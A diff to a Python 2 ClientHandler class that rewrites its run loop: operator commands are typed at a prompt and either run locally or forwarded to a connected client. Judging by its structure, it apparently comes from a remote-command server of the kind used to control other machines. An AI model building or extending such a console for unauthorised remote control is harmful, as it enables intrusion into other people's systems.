@@ -327,23 +327,24 @@ class ClientHandler(threading.Thread):
         return '\nCurrent session duration: %d days, %d hours, %d minutes, %d seconds\n' % (int(time.clock()/86400.0), int((time.clock()%86400.0)/3600.0), int((time.clock()%3600.0)/60.0), int(time.clock() % 60.0))
                  
     def run(self, prompt=None):
-        with self.lock:
-            method, data = ('prompt', prompt) if prompt else server.recv_client()
-        if 'prompt' in method:
-            command = raw_input(data % int(self.name))
-            cmd, _, action = command.partition(' ')
-            if cmd in server.commands:
-                result = server.commands[cmd](action) if len(action) else server.commands[cmd]()
-                with self.lock:
+        while True:
+            if exit_status:
+                break
+            with self.lock:
+                method, data = ('prompt', prompt) if prompt else server.recv_client()
+            if 'prompt' in method:
+                command = raw_input(data % int(self.name))
+                cmd, _, action = command.partition(' ')
+                if cmd in server.commands:
+                    result = server.commands[cmd](action) if len(action) else server.commands[cmd]()
                     print result
                     return self.run(prompt=data)
+                else:
+                    server.send_client(command)
+                    return self.run()
             else:
-                server.send_client(command)
-        else:
-            if data:
-                print data
-        with self.lock:
-            return self.run()
+                if data:
+                    print data
                 
 
 class LogRecordHandler(socketserver.StreamRequestHandler):
